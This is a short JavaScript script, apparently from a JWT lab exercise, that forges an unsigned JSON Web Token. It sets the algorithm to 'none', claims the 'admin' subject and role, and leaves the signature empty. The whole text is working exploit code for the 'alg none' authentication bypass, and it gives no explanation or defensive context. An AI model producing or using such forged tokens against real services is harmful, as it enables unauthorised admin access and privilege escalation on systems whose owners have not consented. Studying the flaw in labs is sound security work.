
function base64url(input) {
  return Buffer.from(JSON.stringify(input))
    .toString('base64')
    .replace(/=/g,'')
    .replace(/\+/g,'-')
    .replace(/\//g,'_');
}

const header = { alg: 'none', typ: 'JWT' };
const payload = { sub: 'admin', role: 'admin', iss: 'jwt-lab' };

const token = `${base64url(header)}.${base64url(payload)}.`; // trailing dot for empty signature
console.log(token);
